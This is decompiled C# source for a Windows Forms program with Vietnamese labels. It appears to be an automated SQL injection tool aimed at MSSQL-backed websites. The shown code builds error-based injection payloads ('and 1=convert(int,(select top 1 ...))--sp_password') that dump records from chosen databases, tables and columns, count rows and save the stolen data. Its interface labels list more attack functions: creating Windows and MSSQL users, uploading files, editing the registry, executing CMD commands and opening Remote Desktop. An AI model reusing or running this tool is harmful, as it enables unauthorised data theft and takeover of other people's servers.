							RichTextBox obj8 = richTextBox4;
							((Control)obj8).set_Text(((Control)obj8).get_Text() + "\n======================\n");
						}
					}
				}
				catch (Exception)
				{
					RichTextBox obj9 = richTextBox4;
					((Control)obj9).set_Text(((Control)obj9).get_Text() + "\n");
				}
			}
			else
			{
				MessageBox.Show("Hết bản ghi");
			}
		}
		else if (((Control)comboBox3).get_Text() == "Lấy 5 bản ghi")
		{
			for (int l = 0; l < 5; l++)
			{
				if (i4 <= num5)
				{
					uri = null;
					text2 = "";
					if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i4 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					else
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i4 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					GetHtmlSource(out text2, uri);
					i4++;
					num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
					num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
					if (num == 6)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
						num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
						if (num == 11)
						{
							num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
							num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
						}
					}
					try
					{
						string[] array2 = text2.Substring(num, num4).Split(new char[1] { '|' });
						int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
						for (int j = 0; j < num3; j++)
						{
							RichTextBox obj10 = richTextBox4;
							string text4 = ((Control)obj10).get_Text();
							((Control)obj10).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
							if (j == num3 - 1)
							{
								RichTextBox obj11 = richTextBox4;
								((Control)obj11).set_Text(((Control)obj11).get_Text() + "\n======================\n");
							}
						}
					}
					catch (Exception)
					{
						RichTextBox obj12 = richTextBox4;
						((Control)obj12).set_Text(((Control)obj12).get_Text() + "\n");
					}
				}
				else
				{
					MessageBox.Show("Hết bản ghi");
				}
			}
		}
		else if (((Control)comboBox3).get_Text() == "Lấy 10 bản ghi")
		{
			for (int l = 0; l < 10; l++)
			{
				if (i5 <= num5)
				{
					uri = null;
					text2 = "";
					if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i5 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					else
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i5 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					GetHtmlSource(out text2, uri);
					i5++;
					num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
					num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
					if (num == 6)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
						num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
						if (num == 11)
						{
							num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
							num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
						}
					}
					try
					{
						string[] array2 = text2.Substring(num, num4).Split(new char[1] { '|' });
						int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
						for (int j = 0; j < num3; j++)
						{
							RichTextBox obj13 = richTextBox4;
							string text4 = ((Control)obj13).get_Text();
							((Control)obj13).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
							if (j == num3 - 1)
							{
								RichTextBox obj14 = richTextBox4;
								((Control)obj14).set_Text(((Control)obj14).get_Text() + "\n======================\n");
							}
						}
					}
					catch (Exception)
					{
						RichTextBox obj15 = richTextBox4;
						((Control)obj15).set_Text(((Control)obj15).get_Text() + "\n");
					}
				}
				else
				{
					MessageBox.Show("Hết bản ghi");
				}
			}
		}
		else if (((Control)comboBox3).get_Text() == "Lấy 20 bản ghi")
		{
			for (int l = 0; l < 20; l++)
			{
				if (i6 <= num5)
				{
					uri = null;
					text2 = "";
					if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i6 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					else
					{
						weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i6 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
					}
					GetHtmlSource(out text2, uri);
					i6++;
					num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
					num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
					if (num == 6)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
						num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
						if (num == 11)
						{
							num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
							num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
						}
					}
					try
					{
						string[] array2 = text2.Substring(num, num4).Split(new char[1] { '|' });
						int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
						for (int j = 0; j < num3; j++)
						{
							RichTextBox obj16 = richTextBox4;
							string text4 = ((Control)obj16).get_Text();
							((Control)obj16).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
							if (j == num3 - 1)
							{
								RichTextBox obj17 = richTextBox4;
								((Control)obj17).set_Text(((Control)obj17).get_Text() + "\n======================\n");
							}
						}
					}
					catch (Exception)
					{
						RichTextBox obj18 = richTextBox4;
						((Control)obj18).set_Text(((Control)obj18).get_Text() + "\n");
					}
				}
				else
				{
					MessageBox.Show("Hết bản ghi");
				}
			}
		}
		load = 1;
	}

	private void toolStripMenuItem11_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		GiftForm giftForm = new GiftForm();
		((Form)giftForm).ShowDialog();
	}

	private void toolStripMenuItem12_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		AboutForm aboutForm = new AboutForm();
		((Form)aboutForm).ShowDialog();
	}

	private void button22_Click_1(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		if (Convert.ToInt32(listBox2.get_Items().get_Count()) == 0)
		{
			MessageBox.Show("Bạn chưa lấy danh sách bảng");
			return;
		}
		if (Convert.ToInt32(checkedListBox1.get_CheckedItems().get_Count()) == 0)
		{
			MessageBox.Show("Bạn phải chọn 1 trường");
			return;
		}
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select convert(varchar,isnull(convert(varchar, count(" + checkedListBox1.get_CheckedItems().get_Item(0).ToString() + ")),NULL))%2bchar(124) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + "))--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		int length = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num - 1;
		MessageBox.Show("Bảng này có tổng cộng " + responseString.Substring(num, length) + " bản ghi");
	}

	private void toolStripMenuItem10_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		string documentText = webBrowser1.get_DocumentText();
		if (Convert.ToInt32(documentText.Length) <= 200)
		{
			MessageBox.Show(documentText);
		}
	}

	private void button25_Click(object sender, EventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(radioButton1.get_Checked().ToString());
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		if (radioButton1.get_Checked().ToString() == "True")
		{
			((Control)comboBox3).Hide();
			((Control)label10).Show();
			((Control)textBox10).Show();
			((Control)label10).set_Text("where " + ((Control)comboBox2).get_Text() + " =");
		}
		if (radioButton1.get_Checked().ToString() == "False")
		{
			((Control)comboBox3).Show();
			((Control)label10).Hide();
			((Control)textBox10).Hide();
		}
	}

	private void comboBox3_DisplayMemberChanged(object sender, EventArgs e)
	{
	}

	private void button25_Click_1(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		((CommonDialog)saveFileDialog1).ShowDialog();
		StreamWriter streamWriter = File.CreateText(((FileDialog)saveFileDialog1).get_FileName().ToString());
		streamWriter.Write("");
		streamWriter.WriteLine(((Control)richTextBox4).get_Text());
		streamWriter.Close();
	}

	private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void comboBox3_SelectedValueChanged(object sender, EventArgs e)
	{
	}

	private void englishToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!(englishToolStripMenuItem.get_Checked().ToString() == "True"))
		{
			toolStripMenuItem_0.set_Checked(false);
			englishToolStripMenuItem.set_Checked(true);
			((Control)groupBox1).set_Text("Information Server");
			((Control)button2).set_Text("Check System_User");
			((Control)button4).set_Text("Check Remote Desktop Port");
			((Control)button5).set_Text("Go To Remote Desktop");
			((Control)button6).set_Text("Create Window User");
			((Control)button10).set_Text("Create MSSQL User");
			((Control)button12).set_Text("Upload File To Server");
			((Control)button13).set_Text("Interact Server Registry");
			((Control)groupBox3).set_Text("Execute CMD Command");
			((Control)label8).set_Text("CMD Command");
			((Control)button14).set_Text("Execute");
			((Control)button15).set_Text("Get List Database In Server");
			((Control)button16).set_Text("Create DB");
			((Control)button18).set_Text("Get Table");
			((Control)button19).set_Text("Information Table");
			((Control)button21).set_Text("Get Column");
			((Control)button22).set_Text("Count Row In Table");
			((Control)groupBox4).set_Text("List Database");
			((Control)groupBox5).set_Text("List Table");
			((Control)groupBox6).set_Text("List Column");
			((Control)label9).set_Text("Filter :");
			((Control)radioButton1).set_Text("Get only 1 row");
			((Control)radioButton1).set_Text("Get n Rows");
		}
	}

	private void toolStripMenuItem_0_Click(object sender, EventArgs e)
	{
		if (!(toolStripMenuItem_0.get_Checked().ToString() == "True"))
		{
			toolStripMenuItem_0.set_Checked(true);
			englishToolStripMenuItem.set_Checked(false);
		}
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		PHPMainForm pHPMainForm = new PHPMainForm();
		((Form)pHPMainForm).ShowDialog();
	}
}
